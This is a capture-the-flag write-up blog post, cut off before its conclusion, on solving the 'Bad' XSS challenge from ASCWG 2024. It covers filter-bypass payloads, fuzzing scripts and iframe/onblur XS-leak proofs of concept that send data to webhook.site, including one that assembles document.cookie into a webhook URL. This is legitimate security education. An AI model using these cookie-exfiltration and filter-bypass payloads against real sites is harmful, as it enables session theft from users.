<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>&#34;Bad&#34; - Arab Security War Games 2024 :: elmosalamy | blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="In this writeup, I will explain how I solved Bad, an interesting web challenge written by the amazing Abdelhamid Ghazy as part of the recent Arab Security Conference War Games (ASCWG) 2024." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/bad-challenge-arab-security-war-games-2024/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/green.css">



<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="&#34;Bad&#34; - Arab Security War Games 2024">
<meta property="og:description" content="In this writeup, I will explain how I solved Bad, an interesting web challenge written by the amazing Abdelhamid Ghazy as part of the recent Arab Security Conference War Games (ASCWG) 2024." />
<meta property="og:url" content="/posts/bad-challenge-arab-security-war-games-2024/" />
<meta property="og:site_name" content="elmosalamy | blog" />

  <meta property="og:image" content="/images/bad-challenge-cover.png">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2024-08-03 00:00:00 &#43;0000 UTC" />












   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
<script>
  MathJax = {
    tex: {
      displayMath: [['$$', '$$']],  
      inlineMath: [['$', '$']]      
    }
  };
</script>

 
</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    elmosalamy
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a target="" href="/posts">üìù Posts</a></li>
        
      
        
          <li><a target="" href="/tags">üè∑Ô∏è Tags</a></li>
        
      
        
          <li><a target="_blank" href="https://aelmosalamy.github.io">üîó Random stuff</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/posts">üìù Posts</a></li>
      
    
      
        <li><a href="/tags">üè∑Ô∏è Tags</a></li>
      
    
      
        <li><a href="https://aelmosalamy.github.io">üîó Random stuff</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/bad-challenge-arab-security-war-games-2024/">&ldquo;Bad&rdquo; - Arab Security War Games 2024</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2024-08-03 
      </span>
    
    
    <span class="post-author">:: aelmo</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/ctf/">ctf</a>&nbsp;
    
  </span>
  

  
    <img src="/images/bad-challenge-cover.png" class="post-cover" alt="&#34;Bad&#34; - Arab Security War Games 2024" />
  

  
    <div class="table-of-contents">
      <h2>
        
          Table of Contents
        
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#1-what-are-we-up-to">1. What are we up to?</a></li>
    <li><a href="#2-exploring-our-options">2. Exploring our Options</a></li>
    <li><a href="#3-exploiting-the-leak">3. Exploiting the Leak</a></li>
    <li><a href="#4-a-leaky-conclusion">4. A Leaky Conclusion</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <p>In this writeup, I will explain how I solved Bad, an interesting web challenge written by the amazing <em>Abdelhamid Ghazy</em> as part of the recent Arab Security Conference War Games (ASCWG) 2024.</p>
<p>ASCWG had four web challenges. I cleared the first three early in the competition before spending the next 16 hours on <strong>Bad</strong>, submitting only 30 minutes before the end of the CTF.</p>
<h2 id="1-what-are-we-up-to">1. What are we up to?<a href="#1-what-are-we-up-to" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<table>
<thead>
<tr>
<th>Title</th>
<th>Author</th>
<th>Solves</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bad</td>
<td>Abdelhamid Ghazy</td>
<td>3</td>
</tr>
</tbody>
</table>
<p>The challenge was initially black-box but the author decided to open it under pressure from a now-desperate audience.</p>
<p>Regardless, source code was totally irrelevant and added nothing new. The challenge is completely solvable without source code as confirmed by the author as well.</p>
<p>Despite being almost the least solved challenge in the entire CTF, the code was. very simple. Behold the following masterpiece:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$x <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;placeholder&#39;</span>;
</span></span><span style="display:flex;"><span>$x <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/[^a-zA-Z0-9+&#39;.`]/&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,$x);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!doctype HTML&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;title&gt;Bad challenge&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">x = &#39;&lt;?=$x?&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;p&gt;&lt;b&gt;Here the Bad challenge : D inject in ?name=test  get the cookie example from /get-cookies.php&lt;/b&gt;&lt;/p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span></code></pre></div><p>A simple script injection with a rather strict whitelist. We can put anything within <code>x = '&lt;injection here&gt;'</code>, with a twist, the following characters will get removed, no way around it :</p>
<pre tabindex="0"><code>/[^a-zA-Z0-9+&#39;.`]/
</code></pre><p>We also have access to an admin bot as we are very clearly expected to perform some sort of cross-site scripting (XSS). There is an irrelevant path <code>/get-cookies.php</code> that gives us a flag cookie that we can use for testing.</p>
<p>Before opening up the source code I decided to enumerate our allowed characters, Burp Suite Intruder and a simple list was excellent for that, we quickly monitored the response for characters that get reflected and built a list of valid characters based on that.</p>
<p>Conclusion was:</p>
<ul>
<li>We can use numbers, lowercase and uppercase characters.</li>
<li>We can only use the following special characters</li>
</ul>
<pre tabindex="0"><code>` &#39; . +
</code></pre><ul>
<li>We can not use any of these lovely Javascript goodies:</li>
</ul>
<pre tabindex="0"><code>= , / \ &lt;space&gt; ( ) [ ] $
</code></pre><p>A very strict filter indeed. Let&rsquo;s see what can we do with it.</p>
<h2 id="2-exploring-our-options">2. Exploring our Options<a href="#2-exploring-our-options" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>With this knowledge, we can do a simple alert PoC by sending the following payload:</p>
<pre tabindex="0"><code>&#39;+alert`xss`+&#39;
</code></pre><p>Just an example of how you would send this payload (this will be assumed for following examples):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;localhost?name=&#39;%2balert\`xss\`%2b&#39;&#34;</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;script&gt;
</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>+alert<span style="color:#e6db74">`</span>xss<span style="color:#e6db74">`</span>+<span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>&lt;/script&gt;
</span></span></code></pre></div><p>First, I tried to see if I can reach my domain:</p>
<pre tabindex="0"><code>x = &#39;&#39;+fetch`www.webhook.site`+&#39;&#39;;
</code></pre><p>This obviously did not work for the following two reasons,</p>
<ol>
<li>The URL here is relative, and will be treated as such AKA the browser will fetch from <code>https://bad.ascwg-challs.app/www.webhook.site</code>.</li>
</ol>
<p>We know prepending <code>//</code> or <code>\\</code> would make the path absolute as per JS (or maybe HTML spec, not sure) URL normalization rules. If we did not know this fact, we can write a simple PoC to gain clarity on that matter. I wrote this one to make sure I have not missed anything:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xffff</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">c</span><span style="color:#e6db74">}${</span><span style="color:#a6e22e">c</span><span style="color:#e6db74">}</span><span style="color:#e6db74">pwn.hacked.xyz`</span>, <span style="color:#e6db74">&#34;https://www.google.com&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">href</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;https://www.google.com&#34;</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">href</span>, <span style="color:#a6e22e">c</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x2000</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">i</span>, <span style="color:#e6db74">&#34;completed&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Running it against the entire 65,535 character space yields only two such characters (Confirmed):</p>
<pre tabindex="0"><code>https://pwn.hacked.xyz/ /
https://pwn.hacked.xyz/ \
</code></pre><p>These two characters are filtered, so this is probably a dead end.</p>
<ol start="2">
<li>The other reason why our <code>fetch</code> payload is pointless even if we could write new lines, is that calling <code>fetch</code> using the template literal syntax prevents us from including variables (since we do not have <code>$ { }</code> characters).</li>
</ol>
<p>We can not simply do anything like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// relative url as mentioned in 1.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span><span style="color:#e6db74">`www.webhook.com`</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// fetch the website called &#34;document.cookie&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span><span style="color:#e6db74">`document.cookie`</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// add the fetch Promise object to document.cookie, URL is relative anyways
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span><span style="color:#e6db74">`www.webhook.com`</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>;
</span></span></code></pre></div><p>This is all going to fail.</p>
<p>For a good duration, I kept chasing the idea of a &ldquo;newline vulnerability&rdquo;. The challenge still closed-source at the time so I had no way to know that it is a white-box other than fuzzing.</p>
<p>I follow this direction because I felt that being able to write multiple sentences, combined with the ability to store something in a variable, should probably give us more power, who knows?:</p>
<pre tabindex="0"><code>x = some expression
&lt;statement 1&gt;
&lt;statement 2&gt;
     |
&lt;statement n&gt;
</code></pre><p>Quick research yielded this page from the ECMAScript Spec:</p>
<ul>
<li><a href="https://tc39.es/ecma262/multipage/ecmascript-language-lexical-grammar.html">https://tc39.es/ecma262/multipage/ecmascript-language-lexical-grammar.html</a></li>
</ul>
<p>The page is the de-facto reference on the lexical characteristics of Javascript:
<img src="/posts/bad-challenge-arab-security-war-games-2024/js-line-terminators.png"></p>
<p>It seems that, other than the common CR/LF characters, we have two higher codepoints that serve the same function in a Javascript file: <code>LINE SEPARATOR U+2028</code> and <code>PARAGRAPH SEPARATOR U+2029</code>.</p>
<p>To test it, we can copy paste the character from any Unicode viewer into our browser console or do <code>eval(&quot;a=1\u2028b=2&quot;)</code> and confirming that, indeed, both <code>a</code> and <code>b</code> assignments were evaluated. It just a newline!</p>
<p>A quick test:
<img src="/posts/bad-challenge-arab-security-war-games-2024/browser-line-sep.png"></p>
<p>Also within Node.js</p>
<pre tabindex="0"><code>node -e &#34;eval(&#39;a=1&lt;2029&gt;b=2&#39;)&#34;

node -e &#34;eval(&#39;a=1&lt;2029&gt;b=2&#39;)&lt;2029&gt;console.log(a, b)&#34;
1 2
</code></pre><p>In retrospect, these are pretty much useless tests; however, they present a lucrative learning opportunity. These tiny, useless facts do <em>accumulate</em>; so keep following the rabbit holes, they are good for you!</p>
<p>I was not content with this information from the spec, so I hacked together another Node script to automatically scan other characters with similar behavior:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">65535</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sep</span> <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    eval(<span style="color:#e6db74">`a=1</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">sep</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> b=2`</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Separator:&#34;</span>, <span style="color:#a6e22e">sep</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>), <span style="color:#e6db74">&#34;which is &#34;</span>, <span style="color:#a6e22e">sep</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">!</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;Invalid or unexpected token&#34;</span>) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">!</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;Unexpected identifier&#34;</span>)
</span></span><span style="display:flex;"><span>    ) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//console.log(e.message)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>Outputs:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>node bad.js
</span></span><span style="display:flex;"><span>Separator: <span style="color:#ae81ff">10</span> which is
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Separator: <span style="color:#ae81ff">13</span> which is
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Separator: <span style="color:#ae81ff">44</span> which is  ,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Separator: <span style="color:#ae81ff">59</span> which is  ;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Separator: <span style="color:#ae81ff">8232</span> which is
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Separator: <span style="color:#ae81ff">8233</span> which is
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>These are exactly the same codepoints as before but in decimal, note that we also got <em>comma</em> and <em>semicolon</em> because they do indeed allow us to write multiple statements!</p>
<p>We would have missed the fact about commas and semicolons if we just looked at the spec&rsquo;s line terminators section. The spec is, by design, formal.</p>
<p>Specs are meant to describe the characteristics of the language and organize them so implementors can have an easier time following along. We are chasing our own niche goals, and it makes sense to write our own little, niche experiments to test these goals in the most accurate representation. I hope that makes sense.</p>
<p>At this point, I recognize that we need to be able to call functions without <code>()</code>, no way around it since <em>backticks</em> won&rsquo;t suffice.</p>
<p>I kept looking at <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger&rsquo;s excellent XSS cheatsheet</a> for idea, particularly this one:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alert</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#75715e">/**/</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#75715e">/**/</span> ((<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alert</span>), <span style="color:#ae81ff">1</span>);
</span></span></code></pre></div><p>You can set the global <code>onerror</code> to be a function of your choice, then throw a value. This value will be passed to <code>onerror</code> resulting into a function call with the argument of your choice.</p>
<p>For example, we notice that we have a forward slash <code>/</code> in the body of challenge:</p>
<pre tabindex="0"><code>Here the Bad challenge : D inject in ?name=test get the cookie example from /get-cookies.php
</code></pre><p>Maybe, we can grab the forward slash as so:
<img src="/posts/bad-challenge-arab-security-war-games-2024/forward-slash-body.png"></p>
<p>Then use it to compose a URL which we can call using our little <code>throw</code> trick:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>  document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerText</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>  document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerText</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;webhook.site&#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>  document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerText</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>  document.<span style="color:#a6e22e">cookie</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span> <span style="color:#75715e">/**/</span> ((<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fetch</span>), <span style="color:#a6e22e">x</span>);
</span></span></code></pre></div><p>The idea was very exciting, but impossible:</p>
<ul>
<li>We do not have newline</li>
<li>We do not have space separator (confirmed using another fuzzer script, won&rsquo;t bore you)</li>
<li>We do not have equal, which is necessary to overwrite <code>onerror</code>, I explored options using <code>Object.assign</code> to overwrite a property of <code>window</code>, but nope, over ambitious.</li>
</ul>
<p>I would say, leave nothing to doubt. Make it a habit to build experiments to test your hypotheses. Simple automation scripts like these can often tell you valuable information that are either missed by most documentations or even the spec itself. This is because you are testing directly against the actual implementation (be it a browser, a compiler, etc..)</p>
<p>Let&rsquo;s continue.</p>
<p>I realized we have no chance of doing a function call with a variable, only strings allowed. It has to be another way.</p>
<p>During that time, the challenge author released a one-word announcement <code>xs-leaks</code>.</p>
<p>This sent me to a rabbit hole exploring Cross-site Leaks (XS Leaks). XS Leaks are a form of a side-channel that use certain oddities and disparities in browser behavior to leak information about other sites (cross-site).</p>
<p>So I read:</p>
<ul>
<li><a href="https://xsleaks.dev/">https://xsleaks.dev/</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/xs-search">https://book.hacktricks.xyz/pentesting-web/xs-search</a></li>
</ul>
<p>After some good reading time, one idea caught my eye:</p>
<ul>
<li>Using <code>window.onblur</code> and <code>.onfocus</code> events to leak information</li>
</ul>
<p>Mmm&hellip; ü§î</p>
<p>What if we use the following payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">expression</span><span style="color:#f92672">+</span>window.<span style="color:#a6e22e">focus</span><span style="color:#e6db74">``</span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>We can not have conditions inside our expression; however, if our expression throws an error, the parser will short circuit and not call <code>window.focus</code>!</p>
<p>If the expression is valid, the parser will continue evaluation and call <code>window.focus</code>!</p>
<p>We can perhaps embed this payload within an <code>iframe</code>, put a <code>onblur</code> listener on the parent that makes a <code>fetch</code> to our server and if the condition is valid, the <code>iframe</code> is going to take focus over the parent, resulting in an <code>onblur</code> event which in turn should result in <code>fetch</code>!</p>
<p>I quicky wrote the following PoC:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">iframe</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bad.ascwg-challs.app/?name=&#39;%2bdocument.cookie%2bwindow.focus``%2b&#39;&#34;</span>
</span></span><span style="display:flex;"><span>  &gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">onblur</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">e</span>) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Focus on iframe&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://webhook.site/&#34;</span>);
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span></code></pre></div><p>This payload will always call <code>window.focus</code> and always get us a <code>fetch</code>! How do we make it break?</p>
<p>I tried multiple options before I realized: it is hard to make JS throw an error, at least when you want it to. This behemoth literally accepts anything and everything!</p>
<p>I slowly scanned the docs for String and Array:</p>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array</a></li>
</ul>
<p>Eventually, I came across <code>Array.prototype.with()</code>, probably the only function that I could get to throw an error when out-of-range. Other methods tested:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// all fail gracefully, returning either NaN, &#34;&#34; or undefined.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">at</span>, <span style="color:#a6e22e">slice</span>, <span style="color:#a6e22e">splice</span>, <span style="color:#a6e22e">substr</span>, <span style="color:#a6e22e">substring</span>, <span style="color:#a6e22e">toSpliced</span>;
</span></span></code></pre></div><p>With that knowledge, we can write the following PoC:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">iframe</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bad.ascwg-challs.app/?name=&#39;%2bdocument.cookie.split``.with`50`%2bwindow.focus``%2b&#39;&#34;</span>
</span></span><span style="display:flex;"><span>  &gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    window.<span style="color:#a6e22e">onblur</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">e</span>) =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Focus on iframe&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fetch</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;https://webhook.site/e550ec1f-2266-46ca-b16a-b46a19835a2b/blurred&#34;</span>
</span></span><span style="display:flex;"><span>      );
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span></code></pre></div><p>Sending this payload to the bot, does NOT call <code>fetch</code>!</p>
